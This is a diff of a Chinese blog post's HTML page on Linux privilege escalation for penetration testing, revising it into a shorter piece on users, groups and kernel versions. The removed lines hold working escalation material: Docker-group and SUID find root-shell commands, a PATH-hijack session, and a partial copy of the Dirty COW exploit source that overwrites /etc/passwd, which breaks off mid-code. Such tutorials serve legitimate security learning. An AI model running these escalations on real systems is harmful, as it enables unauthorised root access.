@@ -21,17 +21,18 @@
     <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
     
     <meta name="description" content="">
-    <meta name="description" content="查看Linux内核版本1234uname -srmuname -ahostanmectlcat &#x2F;proc&#x2F;version Linux 3.10.0-957.12.2.el7.x86_64 x86_643 - 内核版本.10 - 主修订版本.0-957 - 次要修订版本.12 - 补丁版本. Linux下的用户权限用户管理按照UID划分：0为超级用户root500-6000为普通用户1-499为伪">
+    <meta name="description" content="基本概念 提权：提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。  Linux内核版本使用一下命令查看Linux内核版本 1234uname -srmuname -ahostanmectlcat &#x2F;proc&#x2F;version  Linux 3.10.0-957.12.2.el7.x86_64 x86_64  3 - 内核版本">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透测试之提权篇">
+<meta property="og:title" content="渗透测试之提权篇一(Linux用户组及内核)">
 <meta property="og:url" content="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="查看Linux内核版本1234uname -srmuname -ahostanmectlcat &#x2F;proc&#x2F;version Linux 3.10.0-957.12.2.el7.x86_64 x86_643 - 内核版本.10 - 主修订版本.0-957 - 次要修订版本.12 - 补丁版本. Linux下的用户权限用户管理按照UID划分：0为超级用户root500-6000为普通用户1-499为伪">
+<meta property="og:description" content="基本概念 提权：提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。  Linux内核版本使用一下命令查看Linux内核版本 1234uname -srmuname -ahostanmectlcat &#x2F;proc&#x2F;version  Linux 3.10.0-957.12.2.el7.x86_64 x86_64  3 - 内核版本">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/1.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/2.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210908111749677.png">
 <meta property="article:published_time" content="2020-10-23T04:54:37.000Z">
-<meta property="article:modified_time" content="2021-08-24T13:14:16.943Z">
+<meta property="article:modified_time" content="2021-09-08T03:18:24.454Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="渗透测试">
 <meta property="article:tag" content="提权">
@@ -40,7 +41,7 @@
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
-    <title>渗透测试之提权篇 · HacKerQWQ&#39;s Studio</title>
+    <title>渗透测试之提权篇一(Linux用户组及内核) · HacKerQWQ&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -235,7 +236,7 @@
                 <a href="/" >HacKerQWQ的博客空间</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">渗透测试之提权篇</a>
+                <a href="#" class="post-name">渗透测试之提权篇一(Linux用户组及内核)</a>
             </div>
     </div>
     
@@ -265,7 +266,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            渗透测试之提权篇
+            渗透测试之提权篇一(Linux用户组及内核)
             <!-- 404 -->
             
         </h1>
@@ -292,7 +293,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">2.7k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1k</span>Reading time: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -422,140 +423,68 @@ height:50vh;
             
 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="查看Linux内核版本"><a href="#查看Linux内核版本" class="headerlink" title="查看Linux内核版本"></a>查看Linux内核版本</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -srm</span><br><span class="line">uname -a</span><br><span class="line">hostanmectl</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
-<p>Linux 3.10.0-957.12.2.el7.x86_64 x86_64<br>3 - 内核版本.<br>10 - 主修订版本.<br>0-957 - 次要修订版本.<br>12 - 补丁版本.</p>
-<h1 id="Linux下的用户权限"><a href="#Linux下的用户权限" class="headerlink" title="Linux下的用户权限"></a>Linux下的用户权限</h1><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>按照UID划分：<br>0为超级用户root<br>500-6000为普通用户<br>1-499为伪用户，不能登录，用于处理系统进程</p>
-<p>经典用户管理文件:<br><code>/etc/passwd</code><br>例子：</p>
+        <h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ul>
+<li>提权：提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL<em>权</em>限以夺得该服务器权限。</li>
+</ul>
+<h2 id="Linux内核版本"><a href="#Linux内核版本" class="headerlink" title="Linux内核版本"></a>Linux内核版本</h2><p>使用一下命令查看Linux内核版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -srm</span><br><span class="line">uname -a</span><br><span class="line">hostanmectl</span><br><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+
+<p><code>Linux 3.10.0-957.12.2.el7.x86_64 x86_64</code></p>
+<ul>
+<li>3 - 内核版本.</li>
+<li>10 - 主修订版本.</li>
+<li>0-957 - 次要修订版本.</li>
+<li>12 - 补丁版本.</li>
+</ul>
+<h2 id="Linux下的用户权限"><a href="#Linux下的用户权限" class="headerlink" title="Linux下的用户权限"></a>Linux下的用户权限</h2><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p>按照UID划分：</p>
+<ul>
+<li>0为超级用户root</li>
+<li>500-6000为普通用户</li>
+<li>1-499为伪用户，不能登录，用于处理系统进程</li>
+</ul>
+<h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><code>/etc/passwd</code>存储用户的基本信息<br>例子：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-<p>分为七个部分<br>账号名称<code>root</code><br>用户密码<code>x</code><br>UID:0<br>GID:0<br>用户相关信息：<code>root</code><br>用户家目录:<code>/root</code><br>用户环境：<code>/bin/bash</code></p>
-<p>用户口令文件：<br><code>/etc/shadow</code><br>例子：</p>
+
+<p>每行用户信息都以<code>:</code>作为分隔符，划分为 7 个字段，每个字段所表示的含义如下：</p>
+<p>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</p>
+<h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><code>/etc/shadow</code>是用户口令文件<br>例子：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$duveWLyJsvTXZE4j$MrFtzxUN9khvw&#x2F;uoWzIfpjZr&#x2F;T.1H7InrqckFYMt1fxKh&#x2F;s7PenGYUznE6EasluKRp1n7xti5jpv6bGmYvwXo.:18544:0:99999:7:::</span><br></pre></td></tr></table></figure>
-<p>此文件只有root用户能访问，分为九个部分<br>用户名：<code>root</code><br>口令：存放加密口令，如果第一个字符是！，表示改用户不能登录<br>最后一次修改时间：<br>最大时间间隔：0 可以随时改变<br>最小时间间隔：99999 表示永远不过期<br>警告时间：1周<br>不活动时间：<br>失效时间：</p>
-<h2 id="用户创建及删除"><a href="#用户创建及删除" class="headerlink" title="用户创建及删除"></a>用户创建及删除</h2><ul>
-<li><p>创建用户<br>sudo useradd -g root test<br><img src="/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/1.png"></p>
-</li>
-<li><p>删除用户<br>sudo userdel test</p>
-</li>
-</ul>
+
+<p>同 /etc/passwd 文件一样，文件中每行代表一个用户，同样使用 <code>:</code> 作为分隔符，不同之处在于，每行用户信息被划分为 9 个字段。每个字段的含义如下：</p>
+<p>用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</p>
+<h2 id="用户创建及删除"><a href="#用户创建及删除" class="headerlink" title="用户创建及删除"></a>用户创建及删除</h2><p>操作如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#创建用户</span><br><span class="line">sudo useradd -g root test</span><br><span class="line">#删除用户</span><br><span class="line">sudo userdel test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/1.png"></p>
 <h2 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h2><p>组分为<strong>私有组</strong>和<strong>标准组</strong>，如果创建用户的时候没有指定加入哪个组，就默认创建一个同名私有组</p>
-<p>用户组管理文件：<br><code>/etc/group</code><br>例子：</p>
+<p>用户组管理文件：<code>/etc/group</code><br>例子：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test:x:1001:</span><br></pre></td></tr></table></figure>
-<p>分为四个部分：<br>组名：test<br>组口令：一般不使用<br>组标识码（GID）：1001<br>组内用户列表：属于改组的所有用户列表</p>
-<ul>
-<li>添加用户组</li>
-</ul>
-<p>useradd username (默认建立username用户组)</p>
-<p>groupadd 组帐号名称</p>
-<ul>
-<li>修改组名</li>
-</ul>
-<p>groupmod -n newName groupName</p>
-<ul>
-<li>删除组帐号</li>
-</ul>
-<p>groupdel 组帐号名称<br>注意：删除的帐号必须存在，且不能是某个用户的私有组</p>
-<ul>
-<li>添加用户到组</li>
-</ul>
-<p>gpasswd -a userName groupName</p>
-<ul>
-<li>从组中删除用户</li>
-</ul>
-<p>gpasswd -d userName groupName</p>
-<ul>
-<li>查看某个用户属于哪个组</li>
-</ul>
-<p>groups userName</p>
-<ul>
-<li>查看某个组有哪些用户</li>
-</ul>
-<p>tail 5 /etc/group 最后一行</p>
-<ul>
-<li>查看一个用户的UID和GID</li>
-</ul>
-<p>id [options] userName eg： id bruce<br>id -g userName 只显示GID<br>id -G userName 显示所有组<br>id -u userName 只显示UID</p>
-<ul>
-<li>查看用户的相关信息，包括用户的主目录，启动shell，用户名等</li>
-</ul>
-<p>finger [options] userName eg: finger bruce<br>finger -l userName<br>finger -s userName<br><img src="/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/2.png"></p>
-<p>转换当前账户:su username</p>
-<h1 id="提权POC大全"><a href="#提权POC大全" class="headerlink" title="提权POC大全"></a>提权POC大全</h1><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a><br><a target="_blank" rel="noopener" href="http://3xp10it.cc/web/2016/09/18/%E6%8F%90%E6%9D%83/">http://3xp10it.cc/web/2016/09/18/%E6%8F%90%E6%9D%83/</a></p>
-<h1 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h1><p>docker组拥有启动docker的权限，此时如果将本地磁盘映射到docker里面并且用容器内的root权限修改，就可以读取宿主机的内容甚至添加拥有sudo权限的用户</p>
-<blockquote>
-<p>docker run -it –rm -v /etc:/etc ubuntu /bin/bash<br>adduser test<br>usermod -aG sudo test</p>
-</blockquote>
-<p>此时已经添加具有sudo的test用户成功了，退出重新进就可以启用了<br>链接:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/170783.html">https://www.freebuf.com/articles/system/170783.html</a></p>
-<h1 id="SUID之find提权"><a href="#SUID之find提权" class="headerlink" title="SUID之find提权"></a>SUID之find提权</h1><blockquote>
-<p>find / -perm -4000 2&gt; /dev/null</p>
-</blockquote>
-<p>查找有特殊权限的suid命令<br>找到/usr/bin/find后</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch <span class="built_in">test</span></span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \;</span><br><span class="line">find <span class="built_in">test</span> -<span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span> \;</span><br></pre></td></tr></table></figure>
-<p>即可提权成功<br>**<a target="_blank" rel="noopener" href="https://jlkl.github.io/2020/01/27/Web_15/">更多SUID提权方法</a>**<br><strong><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+shell">查可利用SUID</a></strong></p>
-<h1 id="PATH提权"><a href="#PATH提权" class="headerlink" title="PATH提权"></a>PATH提权</h1><p>思想就是利用系统查找命令的二进制文件的优先级不同来执行我们的命令，具体可以看Moonback师傅的博客</p>
-<p><a target="_blank" rel="noopener" href="https://www.wolai.com/c18w5sZT8VTmCTVjizqk9w">https://www.wolai.com/c18w5sZT8VTmCTVjizqk9w</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@hackerqwq-virtual-machine:/home/hackerqwq/桌面<span class="comment"># export PATH=/tmp:$&#123;PATH&#125;</span></span><br><span class="line">root@hackerqwq-virtual-machine:/home/hackerqwq/桌面<span class="comment"># echo $PATH</span></span><br><span class="line">/tmp:/tmp:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/<span class="built_in">local</span>/games</span><br><span class="line">root@hackerqwq-virtual-machine:/home/hackerqwq/桌面<span class="comment"># echo &#x27;/bin/sh&#x27; &gt;/tmp/id</span></span><br><span class="line">root@hackerqwq-virtual-machine:/home/hackerqwq/桌面<span class="comment"># chmod 777 /tmp/id</span></span><br><span class="line">root@hackerqwq-virtual-machine:/home/hackerqwq/桌面<span class="comment"># id</span></span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 
-<h1 id="AWD常用提权"><a href="#AWD常用提权" class="headerlink" title="AWD常用提权"></a>AWD常用提权</h1><p>下面分享几个最近两年并且影响范围比较大的：</p>
-<h2 id="0x01脏牛提权"><a href="#0x01脏牛提权" class="headerlink" title="0x01脏牛提权"></a>0x01脏牛提权</h2><p>漏洞编号：CVE-2016-5195<br>漏洞名称：脏牛（Dirty COW）<br>漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权<br>影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复</p>
-<h3 id="0x02原理"><a href="#0x02原理" class="headerlink" title="0x02原理"></a>0x02原理</h3><p>Linux内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.）</p>
-<p>竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。<br>脏牛提权官网<br><a target="_blank" rel="noopener" href="https://dirtycow.ninja/">https://dirtycow.ninja/</a></p>
-<h3 id="0x03测试"><a href="#0x03测试" class="headerlink" title="0x03测试"></a>0x03测试</h3><ol>
-<li>官方exp不常用<br><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io">https://github.com/dirtycow/dirtycow.github.io</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">dirtycow</a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="keyword">char</span> *username;</span><br><span class="line">   <span class="keyword">char</span> *hash;</span><br><span class="line">   <span class="keyword">int</span> user_id;</span><br><span class="line">   <span class="keyword">int</span> group_id;</span><br><span class="line">   <span class="keyword">char</span> *info;</span><br><span class="line">   <span class="keyword">char</span> *home_dir;</span><br><span class="line">   <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 